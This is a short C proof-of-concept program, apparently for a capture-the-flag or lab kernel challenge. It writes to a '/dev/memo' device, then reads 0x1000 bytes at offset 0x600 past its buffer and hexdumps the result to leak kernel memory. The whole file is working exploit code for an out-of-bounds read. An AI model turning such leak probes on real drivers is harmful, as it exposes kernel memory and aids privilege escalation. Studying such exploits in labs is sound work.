#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <string.h>

#define MAX_SIZE 0x400

#define info(fmt, ...) \
  fprintf(stderr, "[+] "fmt"\n", ##__VA_ARGS__)

#define IS_PRINTABLE(c) (((c) > 31) && ((c) < 127))
void hexdump(void *buffer, size_t size) {
  unsigned char *data = buffer;
  size_t i, j;
  for (i = 0; i < size; i++) {
    unsigned char byte = data[i];    
    printf("%02x ", byte);
    if (((i % 16) == 15) || (i == size - 1)) {
      printf(" |");
      for (j = (i - (i % 16)); j <= i; j++)
        printf("%c", IS_PRINTABLE(data[j]) ? data[j] : '.');
      printf("|\n"); 
    } 
  }
}

int main(void) {
  info("start exploit");

  int fd = open("/dev/memo", O_RDWR);
  if (fd < 0) {
    perror("open");
    exit(1);
  }

  int rc = write(fd, "ciao", 5);  
  if (rc < 0) {
    perror("write");
    exit(1);
  }

  rc = lseek(fd, 0, SEEK_SET);  
  if (rc < 0) {
    perror("lseek");
    exit(1);
  }

  char tmp[5];
  rc = read(fd, tmp, 5);  
  if (rc < 0) {
    perror("read");
    exit(1);
  }
  info("%s", tmp);

  unsigned char *buf = malloc(0x1000);  
  memset(buf, 0x41, 0x1000);
  
  rc = pread(fd, buf, 0x1000, 0x600);
  if (rc <= 0) {
    perror("pread");
  }

  hexdump(buf, 0x1000);
  
  info("end exploit");
  return 0;
}
